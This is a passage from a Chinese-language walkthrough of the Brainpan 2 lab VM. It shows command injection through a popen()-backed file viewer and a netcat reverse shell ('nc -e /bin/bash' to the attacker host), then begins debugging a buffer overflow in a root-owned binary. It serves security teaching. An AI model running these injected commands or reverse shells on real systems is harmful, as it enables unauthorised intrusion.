+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AUTHENTICATION</span><br><span class="line">       There is currently no proper authentication mechanism <span class="keyword">in</span> place. At this</span><br><span class="line">       time  the software is <span class="keyword">in</span> it<span class="string">&#x27;s alpha stage. The only avaiable account is</span></span><br><span class="line"><span class="string">       GUEST. The DEBUG account will alter the output of some commands -  use\u2010</span></span><br><span class="line"><span class="string">       ful for developers.</span></span><br></pre></td></tr></table></figure>
+
+<p>提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 192.168.56.116 9999</span></span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line">[______________________ WELCOME TO BRAINPAN 2.0________________________]</span><br><span class="line">                             LOGIN AS GUEST                             </span><br><span class="line"></span><br><span class="line">                          &gt;&gt; DEBUG</span><br><span class="line">                          ACCESS GRANTED</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                             *  *  *  *                                </span><br><span class="line">    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  </span><br><span class="line">    TYPE <span class="string">&quot;TELL ME MORE&quot;</span> FOR A LIST OF COMMANDS.  </span><br><span class="line">                             *  *  *  *                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                          &gt;&gt; SYSTEM</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HOME=/home/anansi</span><br><span class="line">COLORTERM=(null)</span><br><span class="line">PWD=/opt/brainpan</span><br><span class="line">PATH=/bin:.:/usr/bin:/sbin</span><br><span class="line">SHLVL=1</span><br></pre></td></tr></table></figure>
+
+<p>在这里停止一下，总结一下已经了解的有关目标的知识：</p>
+<ul>
+<li>它以单个IP：192.168.57.1​​0运行（在我的情况下）</li>
+<li>它有两个开放端口9999和10000</li>
+<li>在端口10000上正在运行http服务器（此处无趣）</li>
+<li>该http服务器基于Python，这意味着Python已安装并且可以使用</li>
+<li>在端口9999上运行某些自定义文件传输</li>
+<li>应用自定义应用程序不仅可以在应用程序根目录中提供读取&#x2F;写入系统中文件的功能</li>
+<li>该应用程序在&#x2F;opt&#x2F;brainpan中</li>
+<li>对DEBUG用户的访问不受限制，因此可以完全访问该应用</li>
+<li>从notes.txt中知道应用程序正在使用popen（）查看文件等。</li>
+</ul>
+<p>可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="built_in">command</span> argument is a pointer to a null-terminated string containing a shell <span class="built_in">command</span> line. This <span class="built_in">command</span> is passed to /bin/sh using the -c flag; interpretation, <span class="keyword">if</span> any, is performed by the shell.</span><br></pre></td></tr></table></figure>
+
+<p>命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给&#x2F;bin&#x2F;sh；解释（如果有）由shell执行。</p>
+<p>意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">                          &gt;&gt; VIEW  </span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; <span class="built_in">echo</span> <span class="string">&quot;some unexpected text lucifer11&quot;</span>;           </span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">some unexpected text lucifer11</span><br><span class="line"></span><br><span class="line">                          &gt;&gt; VIEW</span><br><span class="line">    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;</span><br><span class="line">TODO LIST</span><br><span class="line">---------</span><br><span class="line">reynard: </span><br><span class="line"> - Completed manpage. Read with groff or man.</span><br><span class="line"> - Renamed to brainpan.txt instead of brainpan.7.</span><br><span class="line"> - Fixed call to <span class="built_in">read</span> manpage: popen(<span class="string">&quot;man ./brainpan.txt&quot;</span>, <span class="string">&quot;r&quot;</span>); </span><br><span class="line"></span><br><span class="line">puck:</span><br><span class="line">Easiest way to display file contents is to just use popen(). Eg:</span><br><span class="line">popen(<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/bin/man ./brainpan.7&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;/usr/bin/top&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">etc... </span><br><span class="line"></span><br><span class="line">anansi: </span><br><span class="line"> - Fixed a reported buffer overflow <span class="keyword">in</span> login <span class="keyword">in</span> version 1.0. </span><br><span class="line"> - Discovered buffer overflow <span class="keyword">in</span> the <span class="built_in">command</span> prompt, fixed as of version 2.0</span><br><span class="line"></span><br><span class="line">puck: look into loading a configuration file instead of hardcoding settings </span><br><span class="line"><span class="keyword">in</span> the server, version 1.8</span><br><span class="line">anansi: dropped configuration file - leave it hardcoded, version 1.9</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  </span><br><span class="line">          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:213 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:16436  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br></pre></td></tr></table></figure>
+
+<p>可以从输出看到;后面的命令已经被成功执行</p>
+<p>创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">                      &gt;&gt; VIEW</span><br><span class="line">ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666</span><br></pre></td></tr></table></figure>
+
+<p>监听6666端口，成功的返回了shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">192.168.56.116: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(anansi) gid=1000(anansi) <span class="built_in">groups</span>=1000(anansi),50(staff)</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br><span class="line">anansi@brainpan2:/opt/brainpan$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(anansi) gid=1000(anansi) <span class="built_in">groups</span>=1000(anansi),50(staff)</span><br><span class="line">anansi@brainpan2:/opt/brainpan$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan2:/opt/brainpan$</span><br></pre></td></tr></table></figure>
+
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ <span class="built_in">ls</span>  </span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">msg_root  readme.txt  startweb.sh  web</span><br><span class="line">anansi@brainpan2:/home/reynard$ ./msg_root</span><br><span class="line">./msg_root</span><br><span class="line">usage: msg_root username message</span><br></pre></td></tr></table></figure>
+
+<p>anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer</span><br><span class="line">python -m SimpleHTTPServer</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /robots.txt HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:00] <span class="string">&quot;GET /favicon.ico HTTP/1.1&quot;</span> 404 -</span><br><span class="line">192.168.56.1 - - [02/Feb/2020 20:41:04] <span class="string">&quot;GET /msg_root HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<p>使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">anansi@brainpan2:/home/reynard$ gdb msg_root</span><br><span class="line">gdb msg_root</span><br><span class="line">GNU gdb (GDB) 7.4.1-debian</span><br><span class="line">Copyright (C) 2012 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;i486-linux-gnu&quot;</span>.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;...</span><br><span class="line">Reading symbols from /home/reynard/msg_root...done.</span><br><span class="line"></span><br><span class="line">(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      </span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x61616161 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb) BT</span><br><span class="line">BT</span><br><span class="line"><span class="comment">#0  0x61616161 in ?? ()</span></span><br><span class="line"><span class="comment">#1  0x0804872e in get_name (u=0xbffffe70 &#x27;a&#x27; &lt;repeats 108 times&gt;, </span></span><br><span class="line">    m=0xbffffedd <span class="string">&#x27;a&#x27;</span> &lt;repeats 87 <span class="built_in">times</span>&gt;) at msg_root.c:26</span><br><span class="line"><span class="comment">#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35</span></span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+
+<p>已经在hte中检查了文件，并在其中找到了一些函数：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">save_msg</span><br><span class="line">get_name</span><br><span class="line">main</span><br></pre></td></tr></table></figure>
+
+<p>执行应用程序后，将转到：main -&gt; get_name -&gt; save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble get_name</span><br><span class="line">disassemble get_name</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> get_name:</span><br><span class="line">   0x080486a1 &lt;+0&gt;:     push   %ebp</span><br><span class="line">   0x080486a2 &lt;+1&gt;:     mov    %esp,%ebp</span><br><span class="line">   0x080486a4 &lt;+3&gt;:     sub    <span class="variable">$0x20</span>,%esp</span><br><span class="line">   0x080486a7 &lt;+6&gt;:     movl   <span class="variable">$0x804863c</span>,-0x4(%ebp)</span><br><span class="line">   0x080486ae &lt;+13&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486b1 &lt;+16&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486b4 &lt;+19&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x080486b9 &lt;+24&gt;:    cmp    <span class="variable">$0x11</span>,%eax</span><br><span class="line">   0x080486bc &lt;+27&gt;:    ja     0x80486d2 &lt;get_name+49&gt;</span><br><span class="line">   0x080486be &lt;+29&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486c1 &lt;+32&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486c5 &lt;+36&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486c8 &lt;+39&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486cb &lt;+42&gt;:    call   0x80484b0 &lt;strcpy@plt&gt;</span><br><span class="line">   0x080486d0 &lt;+47&gt;:    jmp    0x80486ec &lt;get_name+75&gt;</span><br><span class="line">   0x080486d2 &lt;+49&gt;:    movl   <span class="variable">$0x12</span>,0x8(%esp)</span><br><span class="line">   0x080486da &lt;+57&gt;:    mov    0x8(%ebp),%eax</span><br><span class="line">   0x080486dd &lt;+60&gt;:    mov    %eax,0x4(%esp)</span><br><span class="line">   0x080486e1 &lt;+64&gt;:    lea    -0x12(%ebp),%eax</span><br><span class="line">   0x080486e4 &lt;+67&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x080486e7 &lt;+70&gt;:    call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x080486ec &lt;+75&gt;:    movl   <span class="variable">$0x7d0</span>,(%esp)</span><br><span class="line">   0x080486f3 &lt;+82&gt;:    call   0x80484c0 &lt;malloc@plt&gt;</span><br><span class="line">   0x080486f8 &lt;+87&gt;:    mov    %eax,-0x8(%ebp)</span><br><span class="line">   0x080486fb &lt;+90&gt;:    mov    0xc(%ebp),%eax</span><br><span class="line">   0x080486fe &lt;+93&gt;:    mov    %eax,(%esp)</span><br><span class="line">   0x08048701 &lt;+96&gt;:    call   0x8048500 &lt;strlen@plt&gt;</span><br><span class="line">   0x08048706 &lt;+101&gt;:   mov    %eax,0x8(%esp)</span><br><span class="line">   0x0804870a &lt;+105&gt;:   mov    0xc(%ebp),%eax</span><br><span class="line">   0x0804870d &lt;+108&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048711 &lt;+112&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048714 &lt;+115&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048717 &lt;+118&gt;:   call   0x8048540 &lt;strncpy@plt&gt;</span><br><span class="line">   0x0804871c &lt;+123&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x0804871f &lt;+126&gt;:   mov    %eax,0x4(%esp)</span><br><span class="line">   0x08048723 &lt;+130&gt;:   lea    -0x12(%ebp),%eax</span><br><span class="line">   0x08048726 &lt;+133&gt;:   mov    %eax,(%esp)</span><br><span class="line">==&gt;0x08048729 &lt;+136&gt;:   mov    -0x4(%ebp),%eax</span><br><span class="line">   0x0804872c &lt;+139&gt;:   call   *%eax</span><br><span class="line">   0x0804872e &lt;+141&gt;:   mov    -0x8(%ebp),%eax</span><br><span class="line">   0x08048731 &lt;+144&gt;:   mov    %eax,(%esp)</span><br><span class="line">   0x08048734 &lt;+147&gt;:   call   0x8048490 &lt;free@plt&gt;</span><br><span class="line">   0x08048739 &lt;+152&gt;:   leave  </span><br><span class="line">   0x0804873a &lt;+153&gt;:   ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。</p>
+<p>这是用户提供有效输入时的场景：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08048729</span><br><span class="line">b *0x08048729</span><br><span class="line">Breakpoint 1 at 0x8048729: file msg_root.c, line 26.</span><br><span class="line">(gdb) r aaaaaaa b</span><br><span class="line">r aaaaaaa b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root aaaaaaa b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff2b <span class="string">&quot;aaaaaaa&quot;</span>, </span><br><span class="line">    m=0xbfffff33 <span class="string">&quot;b&quot;</span>) at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) x <span class="variable">$ebp</span>-4</span><br><span class="line">x <span class="variable">$ebp</span>-4</span><br><span class="line">0xbffffd54:     0x0804863c</span><br><span class="line">(gdb) x/12xw <span class="variable">$esp</span></span><br><span class="line">x/12xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14</span><br><span class="line">0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33</span><br></pre></td></tr></table></figure>
+
+<p>您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/8xw 0x0804a008</span><br><span class="line">x/8xw 0x0804a008</span><br><span class="line">0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;aaaaaaa&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd30       0xbffffd30</span><br><span class="line">eax            0x804863c        134514236</span><br></pre></td></tr></table></figure>
+
+<p>可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(gdb) r a b</span><br><span class="line">r a b</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">y</span><br><span class="line"></span><br><span class="line">Starting program: /home/reynard/msg_root a b</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048729 <span class="keyword">in</span> get_name (u=0xbfffff31 <span class="string">&quot;a&quot;</span>, m=0xbfffff33 <span class="string">&quot;b&quot;</span>)</span><br><span class="line">    at msg_root.c:26</span><br><span class="line">26      <span class="keyword">in</span> msg_root.c</span><br><span class="line">(gdb) x/16xw <span class="variable">$esp</span></span><br><span class="line">x/16xw <span class="variable">$esp</span></span><br><span class="line">0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14</span><br><span class="line">0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c</span><br><span class="line">0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33</span><br><span class="line">0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14</span><br><span class="line">(gdb) i r ebp eax</span><br><span class="line">i r ebp eax</span><br><span class="line">ebp            0xbffffd58       0xbffffd58</span><br><span class="line">eax            0xbffffd46       -1073742522</span><br><span class="line">(gdb) s</span><br><span class="line">s</span><br><span class="line">save_msg (u=0xbffffd46 <span class="string">&quot;a&quot;</span>, m=0x804a008 <span class="string">&quot;b&quot;</span>) at msg_root.c:6</span><br><span class="line">6       <span class="keyword">in</span> 